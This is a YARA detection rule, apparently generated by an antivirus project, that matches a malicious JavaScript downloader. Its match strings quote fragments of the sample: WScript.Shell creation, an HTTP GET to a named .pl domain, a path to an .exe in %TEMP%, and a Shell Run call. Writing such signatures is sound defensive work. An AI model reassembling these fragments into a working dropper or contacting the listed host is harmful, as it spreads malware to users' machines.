rule sig_20160401_161368eddd45bc45d0066e765492c595 {
  meta:
    description = "datamaliciousorder - file 20160401_161368eddd45bc45d0066e765492c595.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b90a3e17b9f08490f64d63ddfca4931211f77520e748f0df06b5f53e13ee710a"

  strings:
    $s1  = "function HhvDua(RrJvy, CpyUdh){LmNm = LmNm * 1; return RrJvy - CpyUdh;};" fullword ascii
    $s2  = "var VsUx = function HlkPoo() {return WScript[KdLt](\"WScript\"+\".Shell\");}(), AhIy = 11;" fullword ascii
    $s3  = "if (ZgdJh[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "ZgdJh[KgGbz](\"G\" + \"ET\", \"http://garmulewicz.pl/v4yhsa\", false);" fullword ascii
    $s5  = "function KzWj(){return UkGl + \"\";};" fullword ascii
    $s6  = "function GlXd() {return VsUx[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"qIbd6Vl5TqiQ.ex\" + \"e\";};" fullword ascii
    $s7  = "function CsxNh() {return ((HaKf == true) && (HaKf == AkoSz)) ? 1 : LmNm;};" fullword ascii
    $s8  = "var HaKf = false;" fullword ascii
    $s9  = "AkoSz = true; " fullword ascii
    $s10 = "function WpYbw(){return 23;};" fullword ascii
    $s11 = "var MaWb = false;" fullword ascii
    $s12 = "}while (OmBs);" fullword ascii
    $s13 = "var AkoSz = false;" fullword ascii
    $s14 = "function YrjNrj(ZnLp) {var YwcErq = (1, 2, 3, 4, 5, ZnLp); return YwcErq;};" fullword ascii
    $s15 = "HaKf = true; " fullword ascii
    $s16 = "function QywXtd(EthMhx){VsUx[\"R\"+\"un\"](EthMhx, LmNm, LmNm);};" fullword ascii
    $s17 = "return HhvDua(TdrLz, MlLf);" fullword ascii
    $s18 = "var TdVa = new this[\"Date\"]();" fullword ascii
    $s19 = "function IeTjd(){return KdLt;};" fullword ascii
    $s20 = "function AqEvv()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}